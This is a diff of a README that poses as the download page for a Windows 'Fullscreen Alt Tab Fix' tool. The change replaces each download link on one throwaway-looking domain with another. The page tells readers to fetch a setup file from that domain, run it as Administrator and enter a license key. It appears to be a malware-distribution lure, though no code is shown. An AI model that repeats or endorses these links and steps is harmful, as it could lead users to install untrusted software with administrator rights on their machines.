@@ -13,27 +13,27 @@ Fix **fullscreen alt tab fix games** on Windows 10/11. Built for PC gamers — i
 > **This is the download page.** Use the button or link below to get **Fullscreen Alt Tab Fix** for Windows.
 
 <p align="center">
-  <a href="https://alttabfix.zipzapsol.space/">
+  <a href="https://alttabfix.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Fullscreen%20Alt%20Tab%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Fullscreen Alt Tab Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[alttabfix.zipzapsol.space](https://alttabfix.zipzapsol.space/)** |
-| **Full URL** | `https://alttabfix.zipzapsol.space/` |
+| **Direct link** | **[alttabfix.wonderchain.fun](https://alttabfix.wonderchain.fun/)** |
+| **Full URL** | `https://alttabfix.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — alttabfix.zipzapsol.space](https://alttabfix.zipzapsol.space/)** (link above)
+1. Click **[Download — alttabfix.wonderchain.fun](https://alttabfix.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://alttabfix.zipzapsol.space/"><strong>⬇ Download Fullscreen Alt Tab Fix now</strong></a></p>
+<p align="center"><a href="https://alttabfix.wonderchain.fun/"><strong>⬇ Download Fullscreen Alt Tab Fix now</strong></a></p>
 
 ---
 
